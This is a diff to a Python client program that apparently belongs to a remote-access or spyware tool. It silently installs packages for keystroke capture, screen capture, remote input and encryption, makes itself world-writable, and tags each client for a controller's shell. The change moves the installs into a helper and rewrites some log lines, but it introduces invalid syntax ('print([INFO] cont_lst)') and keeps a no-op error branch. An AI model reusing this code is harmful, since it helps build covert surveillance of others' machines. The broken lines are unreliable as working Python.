@@ -30,6 +30,16 @@ environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'
 first_execution = True
 system_os = platform.platform().lower()
 
+def instaling_libs(libs):
+    from subprocess import Popen, PIPE
+    for lib in libs:
+        stdin, stderr = Popen(f'pip3 show {lib}', stdout=PIPE, stderr=PIPE, shell=True).communicate()
+        if stderr:
+            print(f'[INFO] instaling {lib}')
+            os.system(f'pip3 install {lib}')
+        else:
+            print(f'[INFO] Requirement already satisfied:{lib}')
+
 if 'linux' in str(platform.platform()).lower():
     if not 'screen on' in str(os.popen('screen -ls')).lower():
         os.environ["QT_QPA_PLATFORM"] = "offscreen"
@@ -37,36 +47,12 @@ if 'linux' in str(platform.platform()).lower():
 if first_execution:
     if 'linux' in system_os:
         os.system(f'chmod 777 {os.path.basename(__file__)}')
-        os.system('pip3 install requests')
-        os.system('pip3 install Pillow')
-        os.system('pip3 install pyautogui')
-        os.system('pip3 install wmi')
-        os.system('pip3 install pytest-shutil')
-        os.system('pip3 install cv2')
-        os.system('pip3 install pynput')
-        os.system('pip3 install PyQt5')
-        os.system('pip3 install PyAutoGUI')
-        os.system('pip3 install cryptography')
-        os.system('pip3 install opencv-python')
-        os.system('pip3 install mss')
-        os.system('pip3 install pygame')
-        os.system('pip3 install numpy')
+        modules = ['requests', 'Pillow', 'pyautogui', 'wmi', 'pytest-shutil', 'cv2', 'pynput', 'PyQt5', 'PyAutoGUI', 'cryptography', 'opencv-python', 'mss', 'numpy']
+        instaling_libs(modules)
 
     elif 'windows' in system_os:
-        os.system('pip install Pillow')
-        os.system('pip install requests')
-        os.system('pip install pyautogui')
-        os.system('pip install wmi')
-        os.system('pip install pytest-shutil')
-        os.system('pip install cv2')
-        os.system('pip install pynput')
-        os.system('pip install PyQt5')
-        os.system('pip install PyAutoGUI')
-        os.system('pip install cryptography')
-        os.system('pip install opencv-python')
-        os.system('pip install mss')
-        os.system('pip install pygame')
-        os.system('pip install numpy')
+        modules = ['Pillow', 'requests', 'pyautogui', 'wmi', 'pytest-shutil', 'cv2', 'pynput', 'PyQt5', 'PyAutoGUI', 'cryptography', 'opencv-python', 'opencv-python', 'mss', 'pygame', 'numpy']
+        instaling_libs(modules)
 
     client_tag_nb = (random.randint(int('1' + '0' * 30), int('9' + '0' * 30)))
 
@@ -376,8 +362,8 @@ class Client:
                 #print(rmv_stb)
                 string_output = string_output.replace(rmv_stb, b'')  
         except Exception as exception:
-            print("Exception: {}".format(type(exception).__name__))
-            print("Exception message: {}".format(exception))
+            print("[ERROR] Exception: {}".format(type(exception).__name__))
+            print("[ERROR] Exception message: {}".format(exception))
 
         #print(f'final{string_output}')
 
@@ -769,7 +755,7 @@ class Client:
                         for k, v in x.items():
                             cont_lst += f'{k}: {v}\n'
                         cont_lst += f'\n'
-                    print(cont_lst)
+                    print([INFO] cont_lst)
                     return cont_lst
                 except:
                     f'[@HOST_SHELL%@]An error was occurred'
